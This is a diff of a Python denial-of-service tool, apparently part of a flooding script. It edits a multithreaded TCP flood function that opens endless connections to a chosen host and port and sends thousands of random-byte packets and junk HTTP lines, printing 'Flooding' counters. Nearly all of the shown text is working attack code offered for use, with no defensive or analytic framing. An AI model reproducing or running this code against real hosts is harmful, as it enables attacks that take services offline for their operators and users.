@@ -38,48 +38,50 @@ def TCP(threads, host, port, mode):
     # The main function of this function is 
     # to make a while loop statement and send
     # infinite packets to the target host
+        try:
+            sent = 0 # this will be our variable that defines how many packet are sent
+            while True: # While statement it will run infinitely while program is running
 
-        sent = 0 # this will be our variable that defines how many packet are sent
-        while True: # While statement it will run infinitely while program is running
-
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create socket
-                sock.connect((host, port)) # connect to target host,port
+                try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create socket
+                    sock.connect((host, port)) # connect to target host,port
 
 
-            except socket.error as e:
-                print("[-] Cannot create a TCP connection")
-                print(e)
+                except socket.error as e:
+                    print("[-] Cannot create a TCP connection")
+                    print(e)
 
-            # We will create a packet and send it
-            try:
-                for _ in range(6000):
-                    packet = random._urandom(random.randint(1,2000))
-                    data = str("GET /? {} HTTP/1.1\r\nAccept-language: en-US,en,q=0.5")
+                # We will create a packet and send it
+                try:
+                    for _ in range(6000):
+                        packet = random._urandom(random.randint(1,2000))
+                        data = str("GET /? {} HTTP/1.1\r\nAccept-language: en-US,en,q=0.5")
 
-                    sock.send("{}\r\n".format(data).encode("utf-8"))
+                        sock.send("{}\r\n".format(data).encode("utf-8"))
 
-                    sock.send(packet) # send packet to the connected host
-                    sock.send(packet) # send packet to the connected host
-                    sock.send(packet) # send packet to the connected host
-                    sock.send(packet) # send packet to the connected host
+                        sock.send(packet) # send packet to the connected host
+                        sock.send(packet) # send packet to the connected host
+                        sock.send(packet) # send packet to the connected host
+                        sock.send(packet) # send packet to the connected host
 
-                   
-            except Exception as e:
-                print(f"[-] {e}")
-                time.sleep(.1)
-                continue
 
-            except KeyboardInterrupt:
-                print("[-] Operation canceled")
-                sys.exit()
+                except Exception as e:
+                    print(f"[-] {e}")
+                    time.sleep(.1)
+                    continue
+
+
+
+                else:
+
+                    sent += 1
+                    print("[-] Flooding <<HOST: %s PORT: %s METHOD: %S >> with %s packets"%(host, port, mode, sent))
                 
-            else:
+        except KeyboardInterrupt:
 
-                sent += 1
-                print("[-] Flooding <<HOST: %s PORT: %s METHOD: %S >> with %s packets"%(host, port, mode, sent))
-                
-    
+            print("[-] Operation canceled")
+            sys.exit()
+            
     thread_list = []
     for thread in range(threads):
         t = threading.Thread(target=tcpFlood)
